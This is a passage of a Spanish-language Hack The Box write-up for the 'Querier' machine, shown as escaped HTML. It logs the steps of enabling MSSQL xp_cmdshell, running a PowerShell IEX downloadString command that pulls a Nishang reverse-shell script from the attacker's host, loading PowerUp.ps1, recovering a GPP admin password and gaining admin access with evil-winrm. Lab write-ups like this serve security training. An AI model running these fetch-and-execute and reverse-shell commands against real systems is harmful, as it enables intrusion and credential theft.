SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc:corporate568 
                                                                                                                                
└─# crackmapexec winrm 10.10.10.125 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; mssql-svc &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;corporate568&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; WORKGROUP           1 ⚙
WINRM       10.10.10.125    5985   10.10.10.125     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   10.10.10.125     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] WORKGROUP&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc:corporate568
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que aun con las dos credenciales no tenemos acceso por winrm
Volvemos a Autenticarnos por mysql-service&lt;/p&gt;

&lt;h1 id=&quot;mssclientpy---xp_cmdshell&quot;&gt;Mssclient.py - Xp_CmdShell&lt;/h1&gt;

&lt;p&gt;Ejecucion de comandos atraves de la opcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XP_CMDSHELL&lt;/code&gt; en mysql-service&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mssqlclient.py &apos;WORKGROUP/mssql-svc:corporate568&apos;@10.10.10.125 -windows-auth                      130 ⨯&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Encryption required, switching to TLS
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DATABASE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: master, New Value: master
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LANGUAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PACKETSIZE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: 16192
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span class=&quot;s1&quot;&gt;&apos;master&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ACK: Result: 1 - Microsoft SQL Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140 3232&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands

&lt;span class=&quot;c&quot;&gt;### Paso 1 - Ver el error&lt;/span&gt;
SQL&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ERROR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: SQL Server blocked access to procedure &lt;span class=&quot;s1&quot;&gt;&apos;sys.xp_cmdshell&apos;&lt;/span&gt; of component &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt; because this component is turned off as part of the security configuration &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this server. A system administrator can &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;the use of &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt; by using sp_configure. For more information about enabling &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt;, search &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;SQL Server Books Online.
&lt;span class=&quot;c&quot;&gt;### Paso 2 - Reconfigurar las opciones avanzadas&lt;/span&gt;
SQL&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;show advanced options&quot;&lt;/span&gt;, 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 185: Configuration option &lt;span class=&quot;s1&quot;&gt;&apos;show advanced options&apos;&lt;/span&gt; changed from 0 to 1. Run the RECONFIGURE statement to install.
&lt;span class=&quot;c&quot;&gt;### Paso 3 - Intento Erroneo de Reconfigurar la opcion XP_CMDSHELL&lt;/span&gt;
SQL&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;xp_cmdshell&quot;&lt;/span&gt;, 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] ERROR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 62: The configuration option &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt; does not exist, or it may be an advanced option.
&lt;span class=&quot;c&quot;&gt;### Paso 4 - Re Seteamos el habilitar que se muestren las opciones avanzadas&lt;/span&gt;
SQL&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;show advanced&quot;&lt;/span&gt;, 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 185: Configuration option &lt;span class=&quot;s1&quot;&gt;&apos;show advanced options&apos;&lt;/span&gt; changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL&amp;gt; reconfigure
&lt;span class=&quot;c&quot;&gt;### Paso 5 - Configuramos la opcion xp_cmdShell para que este habilitada&lt;/span&gt;
SQL&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;xp_cmdshell&quot;&lt;/span&gt;, 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 185: Configuration option &lt;span class=&quot;s1&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt; changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL&amp;gt; reconfigure
&lt;span class=&quot;c&quot;&gt;###Paso 6 - R C E - Ejecucion de Comandos&lt;/span&gt;
SQL&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
output                                                                             

&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;   

querier&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc                                                                  

NULL                                                                               

aSQL&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Ganar acceso a la maquina Victima con el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nishang&lt;/code&gt; para ello vamos a postear un archivo del
repositorio de nishan que se va a ejecutar en la maquina victima atraves de una peticion via web a un servidor que nos vamos a estar
compartiendo con python3 desde nuestra maquina atacante con nuestro archivo malicioso Invoke-TCP-Powershell.ps1&lt;/p&gt;

&lt;h1 id=&quot;intrusion-con-powershell---user-mssql-svc&quot;&gt;Intrusion con PowerShell - User mssql-svc&lt;/h1&gt;

&lt;p&gt;Preparamos el comando listo para ejecutarlo con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XP_CMDSHELL&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;powershell IEX(New-Object Net.WebClient).downloadString(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://10.10.16.3/PST.ps1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ponemos nuestro servidor con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python3&lt;/code&gt; y nuestro archivo malicioso renombrado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PST.ps1&lt;/code&gt; y habiendole indicado al final del mismo la intruccion que quemos que nos cargue para que conforme se interprete llame a la funcion que le indicamos al final&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot; Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;IP&amp;gt; -Port 443        &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recibimos correctamente la peticion al recurso en nuestro servidor&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 -m http.server 80                           1 ⚙&lt;/span&gt;
Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
10.10.10.125 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;26/Jan/2022 19:49:10] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PST.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y habiendo preparado una session a la escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; por el puerto indicado&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443 &lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.3] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.125] 49677
Windows PowerShell running as user mssql-svc on QUERIER
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.

PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;querier&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;privesc---powerupps1---enumeracion-windows&quot;&gt;Privesc - PowerUp.ps1 - Enumeracion Windows&lt;/h1&gt;
&lt;p&gt;Enumeramos un poco, al ver que estamos en un proceso con la misma arquitectura de la maquina victima procedemos a Postear nuestro Script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerUp.ps1&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitOperatingSystem
True
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitProcess
True
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Vitctima&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.16.3/PowerUp.ps1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Output&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerUp.ps1&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2196
ProcessId   : 2960
Name        : 2960
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vchost.exe &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; netsvcs &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse &lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;UsoSvc&apos;&lt;/span&gt;
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indowsApps
IdentityReference : QUERIER&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc
Permissions       : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;WriteOwner, Delete, WriteAttributes, Synchronize...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
%PATH%            : C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indowsApps
Name              : C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll &lt;span class=&quot;nt&quot;&gt;-DllPath&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&apos;&lt;/span&gt;

UnattendPath : C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;anther&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;nattend.xml
Name         : C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;anther&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;nattend.xml
Check        : Unattended Install Files

Changed   : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;2019-01-28 23:12:48&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
UserNames : &lt;span class=&quot;s2&quot;&gt;&quot;{Administrator} &quot;&lt;/span&gt;
NewName   : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;BLANK]
Passwords : &lt;span class=&quot;s2&quot;&gt;&quot; {MyUnclesAreMarioAndLuigi!!1!} &quot;&lt;/span&gt;
File      : C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogramData&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roup 
            Policy&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;istory&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;achine&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;references&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups.xml
Check     : Cached GPP Files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Atacante - Recibimos la Peticion de Red&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 -m http.server 80   &lt;/span&gt;
Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
10.10.10.125 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;26/Jan/2022 20:06:27] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PowerUp.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos una Contraseña para el Usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;administrator:MyUnclesAreMarioAndLuigi!!1!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Comprobarlas con Crackmapexec para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Winrm&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Aqui no le ponemos el Domino -WORKGROUP y la pass no es valida&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u administrator -p &apos;MyUnclesAreMarioAndLuigi!!1!&apos;     &lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:HTB.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] HTB.LOCAL&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:MyUnclesAreMarioAndLuigi!!1! STATUS_NO_LOGON_SERVERS 
                                                                                                                                                                    
&lt;span class=&quot;c&quot;&gt;# Aqui le indicamos el dominio -d WORKGROUP &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u administrator -p &apos;MyUnclesAreMarioAndLuigi!!1!&apos; -d WORKGROUP     &lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:MyUnclesAreMarioAndLuigi!!1! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Comprobacion para WINRM&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# crackmapexec winrm 10.10.10.125 -u administrator -p &apos;MyUnclesAreMarioAndLuigi!!1!&apos; -d WORKGROUP                                                                                                            1 ⚙&lt;/span&gt;
WINRM       10.10.10.125    5985   10.10.10.125     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   10.10.10.125     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:MyUnclesAreMarioAndLuigi!!1! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vale pues procedemos a conectarnos a la maquina con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.125 -u administrator -p &apos;MyUnclesAreMarioAndLuigi!!1!&apos;    &lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sacamos la Flag de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Root.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ../Desktop/root.txt
b19c3794f786a1fdxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;persistencia-a-nivel-de-equipo-una-vez-logrado-ser-administrador&quot;&gt;Persistencia a nivel de Equipo una Vez logrado ser Administrador&lt;/h1&gt;

